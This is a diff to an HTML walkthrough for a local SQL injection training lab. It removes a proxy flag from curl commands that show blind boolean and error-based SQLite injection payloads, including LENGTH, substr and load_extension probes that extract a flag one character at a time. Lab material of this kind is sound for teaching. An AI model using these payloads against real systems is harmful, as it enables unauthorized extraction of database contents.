@@ -8,9 +8,9 @@
         <span class="terminal-title">Step 1. Test Boolean Oracle</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND 1=1"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND 1=1"<br>
         <span class="prompt">Response: </span><strong>Product found: ID #1 exists in the catalog.</strong><br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND 1=2"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND 1=2"<br>
         <span class="prompt">Response: </span><strong>No product found with that ID.</strong>
     </div>
 </div>
@@ -26,9 +26,9 @@
         <span class="terminal-title">Step 2. Find Flag Length</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT LENGTH(flag_value) FROM flags LIMIT 1) &gt; 20"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT LENGTH(flag_value) FROM flags LIMIT 1) &gt; 20"<br>
         <span class="prompt">Response: </span>Product found (TRUE -- length &gt; 20)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT LENGTH(flag_value) FROM flags LIMIT 1) = 23"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT LENGTH(flag_value) FROM flags LIMIT 1) = 23"<br>
         <span class="prompt">Response: </span><strong>Product found: ID #1 exists in the catalog.</strong> (TRUE -- flag is 23 characters)
     </div>
 </div>
@@ -67,10 +67,10 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">// TRUE condition -- no error:</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT CASE WHEN substr((SELECT flag_value FROM flags LIMIT 1),1,1)='F' THEN 1 ELSE load_extension('x') END)"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT CASE WHEN substr((SELECT flag_value FROM flags LIMIT 1),1,1)='F' THEN 1 ELSE load_extension('x') END)"<br>
         <span class="prompt">Response: </span><strong>Product found: ID #1 exists in the catalog.</strong><br><br>
         <span class="prompt">// FALSE condition -- error triggered:</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT CASE WHEN substr((SELECT flag_value FROM flags LIMIT 1),1,1)='X' THEN 1 ELSE load_extension('x') END)"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND (SELECT CASE WHEN substr((SELECT flag_value FROM flags LIMIT 1),1,1)='X' THEN 1 ELSE load_extension('x') END)"<br>
         <span class="prompt">Response: </span><strong>SQLite Error: not authorized</strong>
     </div>
 </div>
@@ -105,7 +105,7 @@
         <span class="terminal-title">curl. Manual Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND substr((SELECT flag_value FROM flags LIMIT 1),1,1) = 'F'"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab3" \<br> --data-urlencode "id=1 AND substr((SELECT flag_value FROM flags LIMIT 1),1,1) = 'F'"<br><br>
         <span class="prompt"># </span>Returns "Product found: ID #1 exists in the catalog." -- first char is 'F' (TRUE)
     </div>
 </div>
